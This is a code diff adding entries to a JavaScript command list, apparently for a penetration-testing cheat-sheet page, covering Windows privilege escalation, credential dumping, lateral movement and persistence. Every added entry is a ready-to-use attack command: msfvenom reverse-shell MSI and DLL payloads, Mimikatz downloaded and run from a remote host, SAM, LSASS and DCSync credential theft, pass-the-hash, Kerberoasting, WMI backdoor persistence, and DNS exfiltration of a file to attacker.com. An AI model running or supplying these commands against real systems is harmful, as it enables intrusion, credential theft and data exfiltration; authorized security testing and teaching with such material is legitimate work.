@@ -1333,6 +1333,132 @@ const COMMANDS = [
     tags: ["playbook", "postexploit", "c2"],
     accent: "#ffeb3b"
   },
+  {
+    title: "[P4-EXPLOIT] AlwaysInstallElevated Abuse",
+    code: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=VPS LPORT=4444 -f msi -o evil.msi\\nmsiexec /quiet /qn /i evil.msi",
+    tags: ["playbook", "privesc"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P4-EXPLOIT] Unquoted Service Path Abuse",
+    code: "# If path: C:\\\\Program Files\\\\Vuln Service\\\\service.exe\\n# Drop at: C:\\\\Program.exe\\ncopy payload.exe C:\\\\Program.exe\\nsc stop VulnService & sc start VulnService",
+    tags: ["playbook", "privesc"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P4-EXPLOIT] Weak Service Permissions",
+    code: "accesschk.exe -uwcqv Users * /accepteula\\nsc config VulnSvc binPath= \"net localgroup administrators user /add\"\\nsc stop VulnSvc & sc start VulnSvc",
+    tags: ["playbook", "privesc"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P4-EXPLOIT] JuicyPotato (SeImpersonate)",
+    code: "JuicyPotato.exe -l 1337 -p cmd.exe -a \"/c powershell -enc BASE64\" -t *",
+    tags: ["playbook", "privesc"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P4-EXPLOIT] PrintSpoofer (SeImpersonate)",
+    code: "PrintSpoofer.exe -i -c \"powershell -enc BASE64\"",
+    tags: ["playbook", "privesc"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P4-EXPLOIT] GodPotato (SeImpersonate)",
+    code: "GodPotato.exe -cmd \"cmd /c whoami > C:\\\\temp\\\\proof.txt\"",
+    tags: ["playbook", "privesc"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P5-EXPLOIT] Crack SAM Offline",
+    code: "secretsdump.py -sam sam.save -system system.save LOCAL\\nhashcat -m 1000 hashes.txt rockyou.txt",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P5-EXPLOIT] Mimikatz LogonPasswords",
+    code: "IEX (New-Object Net.WebClient).DownloadString('http://VPS/Invoke-Mimikatz.ps1')\\nInvoke-Mimikatz -Command 'sekurlsa::logonpasswords'",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P5-EXPLOIT] pypykatz LSASS Parse",
+    code: "pypykatz lsa minidump lsass.dmp",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P7-EXPLOIT] Pass-the-Hash",
+    code: "impacket-psexec DOMAIN/user@TARGET -hashes :NTHASH\\nimpacket-wmiexec DOMAIN/user@TARGET -hashes :NTHASH",
+    tags: ["playbook", "lateral"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P7-EXPLOIT] Evil-WinRM Shell",
+    code: "evil-winrm -i TARGET -u user -p password\\nevil-winrm -i TARGET -u user -H NTHASH",
+    tags: ["playbook", "lateral"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P8-EXPLOIT] Kerberoast Attack",
+    code: "Rubeus.exe kerberoast /outfile:hashes.txt\\nimpacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC -request\\nhashcat -m 13100 hashes.txt rockyou.txt",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P8-EXPLOIT] AS-REP Roast",
+    code: "Rubeus.exe asreproast /outfile:asrep.txt\\nimpacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC\\nhashcat -m 18200 asrep.txt rockyou.txt",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P8-EXPLOIT] DCSync Attack",
+    code: "mimikatz # lsadump::dcsync /domain:DOMAIN /user:Administrator\\nimpacket-secretsdump DOMAIN/user:pass@DC_IP",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P8-EXPLOIT] GPP Password Decrypt",
+    code: "gpp-decrypt ENCRYPTED_CPASSWORD",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P3-EXPLOIT] Export All WiFi",
+    code: "netsh wlan export profile key=clear folder=C:\\\\temp",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P3-EXPLOIT] Vault Credential Dump",
+    code: "mimikatz # vault::cred /patch\\nmimikatz # vault::list",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P3-EXPLOIT] Decode Unattend Password",
+    code: "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('BASE64_PASSWORD'))",
+    tags: ["playbook", "postexploit"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P6-EXPLOIT] WMI Event Persistence",
+    code: "$F=Set-WmiInstance -Class __EventFilter -Namespace root\\\\subscription -Arguments @{Name='BD';EventNamespace='root\\\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'\"}\\n$C=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\\\subscription -Arguments @{Name='BD';CommandLineTemplate='powershell -enc BASE64'}\\nSet-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\\\subscription -Arguments @{Filter=$F;Consumer=$C}",
+    tags: ["playbook", "persist"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P6-EXPLOIT] DLL Hijack Payload",
+    code: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=VPS LPORT=4444 -f dll -o evil.dll",
+    tags: ["playbook", "persist"],
+    accent: "#ff5722"
+  },
+  {
+    title: "[P9-EXPLOIT] DNS Exfil",
+    code: "$d=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\\\secret.txt'))\\n($d -split '(.{60})' | ?{$_}) | %{ nslookup \"$_.attacker.com\" }",
+    tags: ["playbook", "postexploit", "c2"],
+    accent: "#ff5722"
+  },
 ];
 
 const list = document.getElementById('cmdList');
